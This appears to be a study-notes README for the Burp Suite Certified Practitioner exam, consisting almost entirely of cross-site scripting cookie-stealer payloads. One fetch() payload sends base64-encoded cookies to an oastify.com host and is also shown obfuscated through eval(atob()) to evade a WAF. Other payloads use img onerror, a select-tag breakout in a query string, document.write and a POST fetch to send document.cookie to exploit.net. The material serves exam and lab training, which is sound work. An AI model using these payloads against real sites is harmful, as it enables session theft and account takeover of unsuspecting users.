
# Burp-Suite-Certified-Practitioner-Exam-Study
Burp Suite Certified Practitioner Exam Study Notes

## Cross Site Scripting

### Cookie Stealers

Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
<sub>WAF is preventing dangerous search filters and tags!</sub>
```JavaScript
fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))
```
<sup>Base64 encode the payload</sup>
```
ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
```
<sub>Test payload on our own session in Search</sub>
```JavaScript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
![This image show after entering the above into search and the collaborator receiving request with base64 cookie value from us.](xss1.png)

Blog post comment section
```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```  

Product and Store lookup
```html
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
```  

Stored XSS Blog post
```JavaScript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```  

Fetch API Cookie Stealer
```JavaScript
<script>
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
